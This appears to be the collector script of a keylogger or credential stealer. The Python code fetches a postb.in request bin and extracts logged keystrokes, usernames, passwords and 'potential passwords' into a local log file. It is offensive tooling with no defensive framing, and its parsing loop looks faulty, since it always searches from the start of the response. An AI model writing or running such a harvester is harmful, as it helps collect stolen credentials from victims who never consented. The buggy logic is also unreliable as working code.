import requests

bin_id = open('binID.txt', 'r').read()
getURL = "https://postb.in/b/" + bin_id

r = requests.get(getURL)
file = open("log.txt", "a")
markers = ["user</strong>", "keystroke</strong>", "passwords</strong>", "potential password</strong>", "username</strong>", "all strings</strong>"]
for s in markers:
	prevInd = 0
	while r.text.find(s, prevInd+len(s)) != -1:
		ind_1 = r.text.find(s)
		ind_2 = r.text.find("</li>", ind_1)
		if s == "keystroke</strong>":
			dat = r.text[ind_1+3+len(s):ind_2]
		else:
			dat = r.text[ind_1+2+len(s):ind_2]
		file.write(s[-len(s):-9]+":\n")
		file.write(dat+"\n")
		prevInd = ind_1

file.write("-------------------------\n")
file.close()